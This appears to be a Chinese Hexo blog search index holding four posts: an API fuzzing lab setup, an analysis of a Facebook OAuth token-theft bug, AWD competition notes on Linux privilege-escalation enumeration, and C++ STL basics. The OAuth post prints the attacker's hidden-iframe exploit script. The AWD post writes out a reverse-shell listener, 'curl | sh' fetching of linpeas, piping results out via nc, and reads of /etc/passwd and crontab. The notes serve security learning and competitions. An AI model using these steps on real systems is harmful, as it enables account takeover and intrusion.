<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>API FUZZING流程说明</title>
    <url>/2023/10/13/API-FUZZING%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E/</url>
    <content><![CDATA[<h1 id="REST-API-FUZZING-实验流程"><a href="#REST-API-FUZZING-实验流程" class="headerlink" title="REST API FUZZING 实验流程"></a>REST API FUZZING 实验流程</h1><p>我的设备：<br>windows11 + 谷歌pixel + 安卓9<br>环境：<br>adb + AppUIAutomator + mitmproxy</p>
<h2 id="adb调试"><a href="#adb调试" class="headerlink" title="adb调试"></a>adb调试</h2><p>建议有线连接，不用频繁的debug而且数据传输快，USB连接之后：</p>
<pre><code>adb dedvices       #查看当前连接的adb设备
</code></pre>
<h2 id="mitm抓包部分"><a href="#mitm抓包部分" class="headerlink" title="mitm抓包部分"></a>mitm抓包部分</h2><ol>
<li>如果使用校园网抓包，要在电脑打开<strong>移动热点</strong>，确保手机和电脑在一个网段内，才能成功抓包。</li>
<li>连上热点后，电脑输入ipconfig，获取<strong>WLAN的ipv4</strong>地址</li>
<li>打开手机，在wifi那里配置代理，ip地址输入上一步抓到的，端口号默认为8080。</li>
</ol>
<h2 id="adb-获取APK包名"><a href="#adb-获取APK包名" class="headerlink" title="adb 获取APK包名"></a>adb 获取APK包名</h2><p>可以使用adb来为手机安装APK：</p>
<pre><code>adb install -d xxx.apk
</code></pre>
<p>安装完成后，打开该apk，然后运行：</p>
<pre><code>adb shell dumpsys window | findstr mCurrentFocus
</code></pre>
<p>获取手机当前正在运行activity的包名，包名为从左到右数<strong>第一个com开头的字段</strong>：<br><img src="/2023/10/13/API-FUZZING%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E/1.jpg"><br>上图中包名为<strong>com.wuba</strong></p>
<h2 id="AppUIAutomator"><a href="#AppUIAutomator" class="headerlink" title="AppUIAutomator"></a>AppUIAutomator</h2><p>AppUIAutomator在使用前，要把所有要运行的app的<strong>包名</strong>放在根目录的<strong>apk_pkgName.txt</strong>文件中，格式为 包名 | APK名字，如：</p>
<pre><code>com.wuba | 58同城
</code></pre>
<p>放好后在当前文件夹打开终端，输入：</p>
<pre><code>Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass   #开放权限，windows必做
python test_integrate.py    #运行
</code></pre>
<h2 id="mitmproxy"><a href="#mitmproxy" class="headerlink" title="mitmproxy"></a>mitmproxy</h2><p>在script.py文件夹打开终端，直接运行：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">mitmdump -s script_json.py</span><br></pre></td></tr></table></figure>

<p>如果没抓到包可能有以下情况：</p>
<ol>
<li>不在一个网段</li>
<li>证书没配置好</li>
<li>代理的ip地址或端口号不对</li>
</ol>
<h2 id="对比脚本部分"><a href="#对比脚本部分" class="headerlink" title="对比脚本部分"></a>对比脚本部分</h2><p>为了方便，统一将对比的两个文件命名为 a.json 和 b.json，然后直接在compare.py所在文件夹打开终端，执行：</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python compare.py</span><br></pre></td></tr></table></figure>

<p>即可，会在当前目录下生成两个文件：</p>
<ol>
<li>cleaned_a.json: 仅保留了和 b 文件 domain+path 相同, 但是 params 不同的 api</li>
<li>cleaned_b.json 同上</li>
</ol>
<p>在运行完脚本后, 请自行在文本对比器里找出哪些 params 不同。</p>
]]></content>
      <categories>
        <category>科研</category>
        <category>API FUZZING</category>
      </categories>
      <tags>
        <tag>API安全</tag>
      </tags>
  </entry>
  <entry>
    <title>【API安全漏洞剖析】 FaceBook OAuth 漏洞 - 2020-03-01</title>
    <url>/2023/11/09/API%E6%BC%8F%E6%B4%9E-facebook-OAuth/</url>
    <content><![CDATA[<h1 id="【API安全漏洞剖析】-FaceBook-OAuth-漏洞-2020-03-01"><a href="#【API安全漏洞剖析】-FaceBook-OAuth-漏洞-2020-03-01" class="headerlink" title="【API安全漏洞剖析】 FaceBook OAuth 漏洞 - 2020-03-01"></a>【API安全漏洞剖析】 FaceBook OAuth 漏洞 - 2020-03-01</h1><p>信息来源: <a href="https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/">https://www.amolbaikar.com/facebook-oauth-framework-vulnerability/</a></p>
<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>第三方网站如(Instagram)是可以通过 Facebook 账号进行登录的, 具体登录逻辑就是利用 Facebook 提供的 SDK,使用 OAuth 授权进行登录。</p>
<p>具体来说就是用户登录 ins, 然后 ins 会根据 FaceBook 的 SDK 规范, 跳转到 Facebook 对应的登录页面, Facebook 登录完成之后, 返回一个 access_token 给 ins, 完成登录。</p>
<p>黑客在这个 OAuth 授权流程能够<strong>窃取 access_token</strong> ,从而达到接管用户账号的目的。</p>
<h2 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h2><p> 在 Facebook 提供给开发者接入的 SDK 中, 有一个名为 “&#x2F;connect&#x2F;ping” 的登录服务端, 它是提供给第三方应用获取用户访问令牌的第三方端点, 具体逻辑是开发者通过编码在后台创建跨域通信的代理 <code>iframe</code> , 再使用 <code>window.postMessage()</code> 方法接收令牌, 在接收令牌后, 该 API 会把链接跳转指向 Facebook 的 “XD_Arbiter” 下。 完整的 URL 为(以 ins 为例):</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.facebook.com/connect/ping?client_id=APP_ID&amp;redirect_uri=https://staticxx.facebook.com/connect/xd_arbiter.php?version=42#origin=https://www.instagram.com</span><br></pre></td></tr></table></figure>

<p> 这里的 <code>APP_ID</code> 是第三方应用在 Facebook 注册时生成的应用 ID 值。</p>
<p> 攻击者发现这里的 <code>xd_arbiter.php?version=42</code> 可以被<strong>篡改</strong>成 <code>xd_arbiter/?version=42</code> , 然后在此基础下, 能够将目录附加到后面实现资源访问。</p>
<p>在这里由于通过上述目录获取到的 <code>access_token</code> 的相关值都是哈希片段, 很难去还原, 但是攻击者在 <code>page_proxy</code> 目录中发现了一个名为 <code>7SWBAvHenEn.js</code> 的 js 文件, 这个文件中包含如下内容:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> frameName = <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>.<span class="title function_">split</span>(<span class="string">&quot;#&quot;</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="variable language_">window</span>.<span class="property">parent</span>.<span class="title function_">postMessage</span>(frameName,<span class="string">&quot;*&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>第一行代码会获取 URL 请求参数中 <code>#</code> 后面的内容, 将它赋值给 <code>frameName</code> , 然后调用 <code>window.parent.postMessage</code> 转发来自 <code>frameName</code> 发送的内容, 这里的 <code>*</code> 代表他可以接收任意源的请求。</p>
<p>然后攻击者构造 URL 为:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://staticxx.facebook.com/connect/xd_arbiter/r/7SWBAvHenEn.js?version=42</span><br></pre></td></tr></table></figure>
<p>就可以穿越访问到这个文件, 再通过 <code>#</code> 去指定源, 就可以拦截该源发送回来的 <code>access_token</code> .</p>
<p>这个 js 文件能够被攻击者利用, 原因如下:</p>
<ol>
<li>攻击者能够通过资源附加访问到这个文件.</li>
<li><code>postMessage()</code> 方法会发送未加密的令牌.</li>
<li><code>*</code> 允许了攻击者能在自己的源 ip 下请求并获取响应.</li>
<li>API 请求中没有验证 <code>X-Frame-Options</code> 标题,导致能够在 <code>xd_arbiter</code> 中嵌入跨域嵌套 <code>postMessage()</code> 回显的窗口.</li>
<li><code>window.parent</code> 下的方法不用与用户交互, 不需要关心<code>window.open</code>或任何<code>onClick</code>事件.</li>
</ol>
<h2 id="漏洞劫持"><a href="#漏洞劫持" class="headerlink" title="漏洞劫持"></a>漏洞劫持</h2><p>最后攻击者重写 <code>Custom_SDK.js</code></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> app_id = <span class="string">&#x27;124024574287414&#x27;</span>,</span><br><span class="line">app_domain = <span class="string">&#x27;www.instagram.com&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> exploit_url = <span class="string">&#x27;https://www.facebook.com/connect/ping?client_id=&#x27;</span> + app_id + <span class="string">&#x27;&amp;redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fconnect%2Fxd_arbiter%2Fr%2F7SWBAvHenEn.js%3Fversion%3D44%23origin%3Dhttps%253A%252F%252F&#x27;</span> + app_domain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> i = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;iframe&#x27;</span>);</span><br><span class="line">i.<span class="title function_">setAttribute</span>(<span class="string">&#x27;id&#x27;</span>, <span class="string">&#x27;i&#x27;</span>);</span><br><span class="line">i.<span class="title function_">setAttribute</span>(<span class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;display:none;&#x27;</span>);</span><br><span class="line">i.<span class="title function_">setAttribute</span>(<span class="string">&#x27;src&#x27;</span>, exploit_url);</span><br><span class="line"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(i);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;OAuth&#x27;</span>, <span class="keyword">function</span>(<span class="params">FB</span>) &#123;</span><br><span class="line">  <span class="title function_">alert</span>(<span class="variable constant_">FB</span>.<span class="property">data</span>.<span class="property">name</span>);</span><br><span class="line">&#125;, !<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>实现跨域攻击, 接管账户.</p>
<h2 id="启示"><a href="#启示" class="headerlink" title="启示"></a>启示</h2><p>作为防守方, 仅仅使用 URL 白名单来防御是不够的, 在面对跨域通信, 不同设备甚至浏览器的情况下, 即使使用了 <code>X-Frame-Options</code> 来防止跨域请求, 也有可能会因为兼容性问题产生漏洞.</p>
<p>在这里的启示就是, 应用设计时, 在实现功能的前提下, 要尽可能遵循简单原则, 参考标准协议实现流程, <strong>线上环境不使用的文件, 要尽快清除</strong>.</p>
]]></content>
      <categories>
        <category>API安全</category>
        <category>漏洞剖析</category>
      </categories>
      <tags>
        <tag>API 安全</tag>
        <tag>OAuth</tag>
        <tag>跨域劫持</tag>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>【AWD】Linux 提权 - 信息枚举</title>
    <url>/2023/11/11/AWD-%E6%8F%90%E6%9D%83%E4%BF%A1%E6%81%AF%E6%9E%9A%E4%B8%BE/</url>
    <content><![CDATA[<h1 id="【AWD】Linux-提权-信息枚举"><a href="#【AWD】Linux-提权-信息枚举" class="headerlink" title="【AWD】Linux 提权 - 信息枚举"></a>【AWD】Linux 提权 - 信息枚举</h1><p>大部分攻防场景, 在维持权限获取 shell 后, 很可能会分配到一个低权限用户, 提权到 root 级别的管理员用户才有 getshell 的意义.</p>
<h2 id="权限体系"><a href="#权限体系" class="headerlink" title="权限体系"></a>权限体系</h2><h3 id="SUID-SGID"><a href="#SUID-SGID" class="headerlink" title="SUID SGID"></a>SUID SGID</h3><p><strong>SUID(Set User ID)</strong> 和 <strong>SGID(Set Group ID)</strong> 统称为 S 位, 被设置在可执行文件上, 当这些位被设置时，文件或程序将以文件所有者或组的权限运行，而不是以运行它的用户的权限运行。</p>
<ul>
<li>SUID: 当 SUID 位被设置, 无论谁运行这个文件，该文件都会以<strong>文件所有者</strong>的权限执行, SUID位通常表示为文件权限字符串中的一个s字符，如果权限是可执行的话，否则它是一个大写的S。</li>
<li>SGID: 当 SGID 位被设置, 该文件会以文件组的权限执行。当SGID设置在目录上时，创建在该目录下的任何新文件都会继承该目录的组ID，而不是继承创建它的用户的主组ID。SGID位在文件权限字符串中也表示为s或S，取决于组权限是否可执行。</li>
</ul>
<h3 id="AppArmor-SElinux"><a href="#AppArmor-SElinux" class="headerlink" title="AppArmor SElinux"></a>AppArmor SElinux</h3><ul>
<li>AppArmor 是一种主要基于路径的强制访问控制（MAC）系统，它允许系统管理员为每个程序定义一个配置文件，来控制程序可以访问的文件和权限。 举个例子, 使用 AppArmor 可以为一个特定的程序指定只能读取特定目录下的文件。</li>
<li>SELinux 基于策略来控制程序之间以及程序与文件之间的交互。与 AppArmor 不同，SELinux 不仅基于路径，而且使用了一套复杂的标签系统（包括类型、角色、用户等标签），这使得它可以实现更精细化的安全控制。</li>
</ul>
<h3 id="不常用的安全机制"><a href="#不常用的安全机制" class="headerlink" title="不常用的安全机制"></a>不常用的安全机制</h3><ul>
<li><strong>Grsecurity</strong>: 为Linux内核提供各种安全增强和补丁的项目, 功能包括角色基础访问控制 (RBAC), 内存保护,审计等</li>
<li><strong>Pax</strong>: 基于内核的保护补丁</li>
<li><strong>ExecShield</strong>: 可执行文件的‘盾’,也是基于内核的安全机制</li>
<li><strong>ASLR(Address Space Layout Random)</strong>: 地址空间布局随机化</li>
<li><strong>TOMOYO Linux</strong>: 也是基于 MAC 的内核安全模块, 比AppArmor轻量级</li>
<li><strong>SMACK (Simplified Mandatory Access Control Kernel)</strong>: SMACK是一个用于Linux的简化的强制访问控制系统。它提供了一种机制，允许系统管理员定义访问控制规则，这些规则指定哪些进程可以访问哪些文件和资源。</li>
<li><strong>Yama</strong>: Yama是一个Linux内核安全模块，提供了一系列安全策略。它最著名的功能之一是限制ptrace系统调用，这有助于防止某些类型的安全漏洞，特别是针对调试和系统监控工具的攻击。</li>
<li><strong>CGroups (Control Groups)</strong>: CGroups是Linux内核的一部分，允许对系统资源（如CPU时间、系统内存、网络带宽等）进行分组管理和限制。这有助于实现资源分配、优先级控制等。</li>
<li><strong>Linux Namespaces</strong>: Linux命名空间是一种提供隔离的技术，它可以将系统的不同部分（如进程、网络、文件系统等）隔离开来，使得在一个命名空间中的进程看不到另一个命名空间中的资源。这是容器技术的关键组成部分。</li>
<li><strong>StackGuard</strong>: StackGuard是一个编译时安全特性，用于防范栈溢出攻击。它通过在栈上插入特殊的“哨兵”值来工作，这些值在函数调用时检查，以防止栈缓冲区溢出。</li>
<li><strong>Proplice</strong>: 这可能是对“Polkit”（以前称为PolicyKit）的提及，这是一个用于控制系统范围内特权的框架。它允许非特权进程向特权进程请求执行特定任务。</li>
<li><strong>seccomp (Secure Computing Mode)</strong>: seccomp是一个Linux内核特性，允许一个进程设定一个“安全模式”，这个模式将限制进程可以调用的系统调用。这有助于限制进程的行为，防止安全漏洞。</li>
<li><strong>ptrace</strong>: ptrace是一种用于调试和监控Linux进程的系统调用。它允许一个进程观察和控制另一个进程的执行，以及检查和改变其内存和寄存器等。</li>
<li><strong>Capsicum</strong>: Capsicum是一种轻量级的操作系统能力和沙箱机制，最初是为FreeBSD开发的，但也有Linux实现。它允许应用程序以最小的特权运行。</li>
<li><strong>Mprotect</strong>: Mprotect是一个系统调用，允许改变一个进程内存区域的保护。这可以用来防止程序的某些部分被修改，或者防止执行非执行内存区域，作为安全措施。</li>
<li><strong>chroot</strong>: chroot是一种改变进程的根目录的操作。这可以用来创建一个隔离的环境，其中进程不能访问主文件系统之外的文件。</li>
<li><strong>firejail</strong>: firejail是一个沙箱程序，用于限制应用程序的运行环境。它通过使用Linux命名空间和seccomp-bpf等技术来提供隔离和安全控制。</li>
</ul>
<h2 id="提权原理"><a href="#提权原理" class="headerlink" title="提权原理"></a>提权原理</h2><ol>
<li>低权限可以修改可执行文件或者脚本, 然后能够以高权限运行这个文件或者脚本.</li>
<li>从用户行为的角度, 运维人员的操作习惯, 管理标准, 他们会把敏感信息留下方便他们操作.</li>
<li>有机会能够在权限体系上层提权, 如内存, cpu 进行操作, 在权限上层捕捉,拦截,修改凭据信息, 如基于内存去读取敏感信息的内核利用.</li>
</ol>
<h2 id="权限枚举"><a href="#权限枚举" class="headerlink" title="权限枚举"></a>权限枚举</h2><h3 id="枚举准备"><a href="#枚举准备" class="headerlink" title="枚举准备"></a>枚举准备</h3><p>权限枚举之前, 可以通过以下方式提高终端交互性和稳定性:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class="line">stty raw -<span class="built_in">echo</span></span><br><span class="line">export TERM=xterm-<span class="built_in">color</span></span><br></pre></td></tr></table></figure>

<p>以上命令通过 python 开启一个 bash 会话, 然后让 stty 通过行读取并禁用 echo. 然后可以使用</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">rlwrap nc -lvnp 端口号</span><br></pre></td></tr></table></figure>

<p>在获取反弹 shell 之前, 用 rlwrap 包裹起来, 这样就可以在终端中用方向键翻命令.</p>
<h3 id="手动枚举"><a href="#手动枚举" class="headerlink" title="手动枚举"></a>手动枚举</h3><p>在这里列举的所有命令中, 第一条是主命令,大多情况适用</p>
<h4 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">whoami # 查看自己的用户</span><br><span class="line">id    # 查看所有用户的权限信息</span><br><span class="line">who   # 当前登录的用户和相关信息, 可以看除了自己以外哪些用户登录了</span><br><span class="line">w     # 当前登录用户的详细信息</span><br><span class="line">last  # 显示系统最近的登录记录</span><br></pre></td></tr></table></figure>

<h4 id="看内核版本"><a href="#看内核版本" class="headerlink" title="看内核版本"></a>看内核版本</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">uname -a #查看当前内核版本</span><br><span class="line">lsb_release -a #查看更详细的信息</span><br><span class="line">cat /proc/version </span><br><span class="line">cat /etc/issue</span><br><span class="line">hostnamectl</span><br></pre></td></tr></table></figure>

<h4 id="查看当前机器的-IP-地址"><a href="#查看当前机器的-IP-地址" class="headerlink" title="查看当前机器的 IP 地址"></a>查看当前机器的 IP 地址</h4><p>用于横向渗透获取内网信息</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ip addr  # 最新最通用的方法</span><br><span class="line">ifconfig # 旧机器的查看 ip 方法</span><br><span class="line">ip route # 查看路由表</span><br><span class="line">ip neigh # 查看网络邻居</span><br><span class="line">arp -a   # 局域网中哪些 mac 地址和 ip 地址做了绑定</span><br></pre></td></tr></table></figure>

<h4 id="查看机器名称"><a href="#查看机器名称" class="headerlink" title="查看机器名称"></a>查看机器名称</h4><p>用于定位角色来排除数据的优先级</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">hostname # 看这个机器的名字</span><br><span class="line">hostnamectl #更详细一点</span><br></pre></td></tr></table></figure>

<h4 id="看当前用户有哪些以-root-的身份执行的"><a href="#看当前用户有哪些以-root-的身份执行的" class="headerlink" title="看当前用户有哪些以 root 的身份执行的"></a>看当前用户有哪些以 <code>root</code> 的身份执行的</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>

<h4 id="查看权限体系"><a href="#查看权限体系" class="headerlink" title="查看权限体系"></a>查看权限体系</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">getcap -r / <span class="number">2</span>&gt;/dev/null # 用 -r 指定根目录, 错误信息扔掉</span><br></pre></td></tr></table></figure>

<h4 id="查看命令"><a href="#查看命令" class="headerlink" title="查看命令"></a>查看命令</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ls -liah # 查看所有文件,包括隐藏文件</span><br><span class="line">ls -a    # 查看全部文件</span><br></pre></td></tr></table></figure>

<h4 id="查看-passwd-文件"><a href="#查看-passwd-文件" class="headerlink" title="查看 passwd 文件"></a>查看 <code>passwd</code> 文件</h4><p>查看用户(名称:密码目录 + 描述 + bash 环境)</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/passwd # 获取用户描述(有 home 目录的就是活跃用户)+对应的 bash 环境</span><br></pre></td></tr></table></figure>

<h4 id="查看自动任务"><a href="#查看自动任务" class="headerlink" title="查看自动任务"></a>查看自动任务</h4><p>具体看是否有 root 权限的自动任务</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>

<h4 id="查看环境变量"><a href="#查看环境变量" class="headerlink" title="查看环境变量"></a>查看环境变量</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> $<span class="built_in">PATH</span> # 查看路径</span><br><span class="line">env  # 看整体环境变了</span><br></pre></td></tr></table></figure>

<h4 id="查看进程信息"><a href="#查看进程信息" class="headerlink" title="查看进程信息"></a>查看进程信息</h4><p>展示出来的列中, UID 是用户类型, PID 是进程号,<br>TTY 是终端类型, TIME 是进程使用的 cpu 时间, CMD 是进程正在运行的命令和可执行文件</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">ps -ef  # 通用</span><br><span class="line">ps axjf # a 查看所有进程, x 没有连接到终端的进程, j 显示进程数, f 输出格式</span><br><span class="line">ps <span class="built_in">aux</span>  # u 显示启动进程的用户</span><br><span class="line">top -n <span class="number">1</span> # top 是定时刷新进程的, 用 -n <span class="number">1</span> 让他只显示一次</span><br></pre></td></tr></table></figure>

<h4 id="查看网络统计"><a href="#查看网络统计" class="headerlink" title="查看网络统计"></a>查看网络统计</h4><p>可以看到占用端口的程序,和他的进程 id</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">netstat -a # 查看所有</span><br><span class="line">netstat -au # 列出所有 TCP, UDP 连接的端口</span><br><span class="line">netstat -l # 列出监听的端口</span><br><span class="line">netstat -s # 统计网络使用的情况</span><br><span class="line">netstat -ano # n 不解析名称, o 显示计时器</span><br></pre></td></tr></table></figure>

<h4 id="查看有-S-位的可执行文件"><a href="#查看有-S-位的可执行文件" class="headerlink" title="查看有 S 位的可执行文件"></a>查看有 S 位的可执行文件</h4><p> 2&gt;&#x2F;dev&#x2F;null 把报错信息给扔掉</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -perm -u=s -<span class="built_in">type</span> f <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h4 id="查看工具是否有安装"><a href="#查看工具是否有安装" class="headerlink" title="查看工具是否有安装"></a>查看工具是否有安装</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">which 工具</span><br><span class="line">which awk perl python ruby gcc vi vim nmap <span class="built_in">find</span> nc wget tftp <span class="number">2</span>&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h4 id="查看哪些磁盘没被挂载"><a href="#查看哪些磁盘没被挂载" class="headerlink" title="查看哪些磁盘没被挂载"></a>查看哪些磁盘没被挂载</h4><p>运维人员做备份或者做系统快照时, 会用一个临时挂载的磁盘存取这些敏感信息.</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">cat /etc/fstab</span><br></pre></td></tr></table></figure>

<h3 id="自动化枚举"><a href="#自动化枚举" class="headerlink" title="自动化枚举"></a>自动化枚举</h3><p>先说说缺点:</p>
<p>自动化枚举往往要搬运工具, 会产生流量和流量特征, 且枚举的消息十分冗长, 要十分熟悉才能找到好的信息, 而且针对性很差.</p>
<p>这里列举工具,记得在 release 里找到对应系统的支持,再去搬运</p>
<ol>
<li>PEASS-ng (主要)</li>
<li>LinEnum (备选)</li>
<li>Linux-smart-enumeration (备选)</li>
<li>Linux-exploit-suggester (备选)</li>
<li>linuxprivchecker (备选,主要用 python)</li>
<li>unix-privesc-check (超级备选</li>
</ol>
<p>不同系统可能没安装对应的语言, 或者对特定语言的函数做了过滤, 要多换几个工具.</p>
<p>以 LinPEASS 为例, 以下是操作方法:</p>
<h4 id="传统方法"><a href="#传统方法" class="headerlink" title="传统方法:"></a>传统方法:</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp # 大多数在 tmp 目录下做</span><br><span class="line">wget https:.... # 搬运工具</span><br><span class="line">ls # 查看可执行文件</span><br><span class="line">chmod +x linpeas.sh # 赋予权限</span><br><span class="line">./linpeas.sh # 执行</span><br></pre></td></tr></table></figure>

<h4 id="推荐方法-有-curl"><a href="#推荐方法-有-curl" class="headerlink" title="推荐方法(有 curl):"></a>推荐方法(有 curl):</h4><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl -L https:... | sh </span><br></pre></td></tr></table></figure>

<p>这里用 <code>-L</code> 追随重定向, 用 <code>|</code> 管道符连接到 <code>sh</code> 直接执行,就不会再本地存储.</p>
<p>如果连不到外网, 就要先在自己的机子本地下载 sh 文件, 然后在启动监听, 再 curl 过去靶机.</p>
<p>本地机 1:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo python3 -m http.server 端口</span><br></pre></td></tr></table></figure>

<p>靶机:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">curl 本地 ip/linpeas.sh | sh</span><br><span class="line">curl 本地 ip/linpeas.sh | sh | nc #本地监听 ip 本地监听端口 # 将扫描结果回弹到本地</span><br></pre></td></tr></table></figure>

<p>本地机 2:</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">sudo nc -lvnp 端口号 | tee linpeas.txt</span><br></pre></td></tr></table></figure>

<p>如果靶机执行第二条语句, 本地机 2 就会获得扫描结果文本.</p>
<p>文章参考视频:</p>
<p><a href="https://www.bilibili.com/video/BV1Wh4y1H7LK/?spm_id_from=333.1007.top_right_bar_window_history.content.click">https://www.bilibili.com/video/BV1Wh4y1H7LK/?spm_id_from=333.1007.top_right_bar_window_history.content.click</a></p>
]]></content>
      <categories>
        <category>AWD</category>
        <category>红队</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>提权</tag>
        <tag>信息枚举</tag>
      </tags>
  </entry>
  <entry>
    <title>【算法】算法基础与 STL</title>
    <url>/2023/11/20/Algorith-bases-and-STL/</url>
    <content><![CDATA[<h1 id="【算法】算法基础与-STL"><a href="#【算法】算法基础与-STL" class="headerlink" title="【算法】算法基础与 STL"></a>【算法】算法基础与 STL</h1><h2 id="时间复杂度"><a href="#时间复杂度" class="headerlink" title="时间复杂度"></a>时间复杂度</h2><p>时间复杂度是算法中基本操作执行次数的数量</p>
<p>时间复杂度排序为</p>
<p><img src="/2023/11/20/Algorith-bases-and-STL/image.png"></p>
<p>在一般的算法测评机中, 大约 1 秒钟能够执行 $5<em>10^8$ 条指令, 也就是说对于 $O(n^2)$ 时间复杂度的算法, 假设 $n$ 最大为 $10^5$, 那么需要的时间最大为 ${(10^{5})}^2&#x2F;5</em>10^8$ 约为 20 秒运行完毕. 在做题的过程中要提前计算运行时间来选择合适复杂度的算法.</p>
<h2 id="空间复杂度"><a href="#空间复杂度" class="headerlink" title="空间复杂度"></a>空间复杂度</h2><p>空间复杂度是运行时所需空间的度量</p>
<p>对于空间复杂度, 除了要计算所给限制以外, 还需要记忆各个类型最大值, 如下</p>
<p><img src="/2023/11/20/Algorith-bases-and-STL/image-1.png" alt="C,C++中常见的数值范围"></p>
<p>避免在写代码时发生类型上溢导致判题不通过.</p>
<h2 id="常见的-STL-容器"><a href="#常见的-STL-容器" class="headerlink" title="常见的 STL 容器"></a>常见的 STL 容器</h2><h3 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vector&gt;</span></span></span><br><span class="line">vector&lt;<span class="type">int</span>&gt; vec;    <span class="comment">//定义</span></span><br><span class="line">vec.<span class="built_in">push_back</span>(a);   <span class="comment">//往后添加元素</span></span><br><span class="line">vec.<span class="built_in">insert</span>(vec.<span class="built_in">begin</span>()+<span class="number">1</span>,<span class="number">2</span>);  <span class="comment">//在下标[1]处插入 2  </span></span><br><span class="line">vec.<span class="built_in">pop_back</span>();     <span class="comment">//移除末尾元素</span></span><br><span class="line">vec.<span class="built_in">erase</span>(vec.<span class="built_in">begin</span>()+<span class="number">1</span>);   <span class="comment">//删除下标[1]处元素</span></span><br><span class="line">vec.<span class="built_in">resize</span>(<span class="number">3</span>)   <span class="comment">//只保留前 3 个元素</span></span><br><span class="line">vec.<span class="built_in">size</span>()  <span class="comment">//判断容器大小</span></span><br><span class="line">vec.<span class="built_in">front</span>() <span class="comment">//获取首元素</span></span><br><span class="line">vec[<span class="number">0</span>]  <span class="comment">//访问数组</span></span><br></pre></td></tr></table></figure>

<h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p><code>set</code> 是集合元素, 会自动剔除重复元素, 内部是由红黑树构成的, 在插入元素时会自动帮你排序</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;set&gt;</span></span></span><br><span class="line">set&lt;<span class="type">int</span>&gt; s  <span class="comment">//定义</span></span><br><span class="line">s.<span class="built_in">insert</span>(<span class="number">10</span>)    <span class="comment">//插入元素</span></span><br><span class="line">s.<span class="built_in">count</span>(<span class="number">10</span>) <span class="comment">//判断元素是否存在</span></span><br><span class="line"><span class="comment">//遍历 set</span></span><br><span class="line">set&lt;<span class="type">int</span>&gt;::iterator it;</span><br><span class="line"><span class="keyword">for</span>(it=s.<span class="built_in">begin</span>();it!=s.<span class="built_in">end</span>();it++)&#123;</span><br><span class="line">    cout&lt;&lt;*it&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//遍历 set(简写)</span></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i:s) cout&lt;&lt;i&lt;&lt;endl;</span><br></pre></td></tr></table></figure>

